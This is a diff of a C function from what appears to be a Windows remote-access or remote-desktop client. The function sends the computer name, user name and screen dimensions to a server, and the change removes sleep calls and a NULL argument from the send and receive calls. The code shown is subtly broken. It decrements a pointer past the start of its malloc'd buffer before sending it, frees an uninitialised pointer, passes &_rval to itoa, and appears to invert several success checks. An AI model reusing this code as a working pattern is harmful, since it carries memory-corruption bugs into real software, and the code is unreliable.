@@ -14,12 +14,10 @@ int net_cmd_Indentify(char* msg, int msgLen)
 	char* rval = malloc(buffLen + 2 + sizeof(char));
 	char *rmsg;
 	memset(rval, 0, buffLen + 3);
-	
-	NET_TRYING_SLEEP();
 
 	if(!GetComputerName(_rval, &buffLen))
 	{
-		if(net_SendData(NULL, "-C", 2) < 1)
+		if(net_SendData("-C", 2) < 1)
 		{
 			free(rmsg);
 
@@ -34,7 +32,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		*rval--;
 		*rval--;
 
-		if(net_SendData(NULL, rval, buffLen + 2) < 1)
+		if(net_SendData(rval, buffLen + 2) < 1)
 		{
 			free(rmsg);
 
@@ -43,7 +41,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 
 		while(1)
 		{
-			if(net_ReciveData(NULL, &rmsg) < 1)
+			if(net_ReciveData(&rmsg) < 1)
 			{
 				if(tries == NET_PROTECT_CPU_TRIES)
 				{
@@ -53,7 +51,6 @@ int net_cmd_Indentify(char* msg, int msgLen)
 				}
 
 				tries++;
-				NET_TRYING_SLEEP();
 			}else{
 				tries = 0;
 				break;
@@ -61,13 +58,12 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		}
 	}
 
-	NET_TRYING_SLEEP();
 	memset(rval, 0, buffLen + 3);
 	memset(_rval, 0, 1024);
 	buffLen = 1024;
 	if(!GetUserName(_rval, &buffLen))
 	{
-		if(net_SendData(NULL, "-U", 2) < 1)
+		if(net_SendData("-U", 2) < 1)
 		{
 			free(rmsg);
 
@@ -82,7 +78,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		*rval--;
 		*rval--;
 
-		if(net_SendData(NULL, rval, buffLen + 2) < 1)
+		if(net_SendData(rval, buffLen + 2) < 1)
 		{
 			free(rmsg);
 
@@ -91,7 +87,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 
 		while(1)
 		{
-			if(net_ReciveData(NULL, &rmsg) < 1)
+			if(net_ReciveData(&rmsg) < 1)
 			{
 				if(tries == NET_PROTECT_CPU_TRIES)
 				{
@@ -101,7 +97,6 @@ int net_cmd_Indentify(char* msg, int msgLen)
 				}
 
 				tries++;
-				NET_TRYING_SLEEP();
 			}else{
 				tries = 0;
 				break;
@@ -109,13 +104,12 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		}
 	}
 
-	NET_TRYING_SLEEP();
 	memset(rval, 0, buffLen + 3);
 	memset(_rval, 0, 1024);
 	buffLen = 1024;
 	if(!itoa(GetSystemMetrics(SM_CXVIRTUALSCREEN), &_rval, 10))
 	{
-		if(net_SendData(NULL, "-X", 2) < 1)
+		if(net_SendData("-X", 2) < 1)
 		{
 			free(rmsg);
 
@@ -130,7 +124,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		*rval--;
 		*rval--;
 
-		if(net_SendData(NULL, rval, buffLen + 2) < 1)
+		if(net_SendData(rval, buffLen + 2) < 1)
 		{
 			free(rmsg);
 
@@ -139,7 +133,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 
 		while(1)
 		{
-			if(net_ReciveData(NULL, &rmsg) < 1)
+			if(net_ReciveData(&rmsg) < 1)
 			{
 				if(tries == NET_PROTECT_CPU_TRIES)
 				{
@@ -149,7 +143,6 @@ int net_cmd_Indentify(char* msg, int msgLen)
 				}
 
 				tries++;
-				NET_TRYING_SLEEP();
 			}else{
 				tries = 0;
 				break;
@@ -157,13 +150,13 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		}
 	}
 
-	NET_TRYING_SLEEP();
 	memset(rval, 0, buffLen + 3);
 	memset(_rval, 0, 1024);
 	buffLen = 1024;
+
 	if(!itoa(GetSystemMetrics(SM_CYVIRTUALSCREEN), &_rval, 10))
 	{
-		if(net_SendData(NULL, "-Y", 2) < 1)
+		if(net_SendData("-Y", 2) < 1)
 		{
 			free(rmsg);
 
@@ -178,7 +171,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 		*rval--;
 		*rval--;
 
-		if(net_SendData(NULL, rval, buffLen + 2) < 1)
+		if(net_SendData(rval, buffLen + 2) < 1)
 		{
 			free(rmsg);
 
@@ -187,7 +180,7 @@ int net_cmd_Indentify(char* msg, int msgLen)
 
 		while(1)
 		{
-			if(net_ReciveData(NULL, &rmsg) < 1)
+			if(net_ReciveData(&rmsg) < 1)
 			{
 				if(tries == NET_PROTECT_CPU_TRIES)
 				{
@@ -197,7 +190,6 @@ int net_cmd_Indentify(char* msg, int msgLen)
 				}
 
 				tries++;
-				NET_TRYING_SLEEP();
 			}else{
 				tries = 0;
 				break;
